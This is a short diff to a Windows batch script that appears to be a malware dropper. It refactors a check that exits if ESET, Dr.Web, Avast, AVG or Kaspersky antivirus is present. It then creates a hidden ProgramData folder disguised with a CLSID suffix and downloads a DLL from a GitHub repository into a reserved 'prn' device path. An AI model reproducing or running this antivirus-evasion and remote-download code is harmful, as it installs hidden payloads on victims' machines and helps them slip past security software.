@@ -1,8 +1,4 @@
-powershell -NoProfile -Command "$av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Where-Object { $_.displayName -match 'ESET|Dr\.Web|Avast|AVG|Kaspersky' }; if ($av) { exit 0 } else { exit 1 }" >nul 2>&1
-
-if not errorlevel 1 (
-    exit /b 1
-)
+powershell.exe -NoProfile -Command "$av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Where-Object { $_.displayName -match 'ESET|Dr\.Web|Avast|AVG|Kaspersky' }; if ($av) { exit 0 } else { exit 1 }" >nul 2>&1 && exit /b 1
 
 mkdir %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
 %WINDIR%\System32\curl.exe -s -L -o "\\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn" "https://github.com/vltex/0/raw/main/1/wintun.dll"
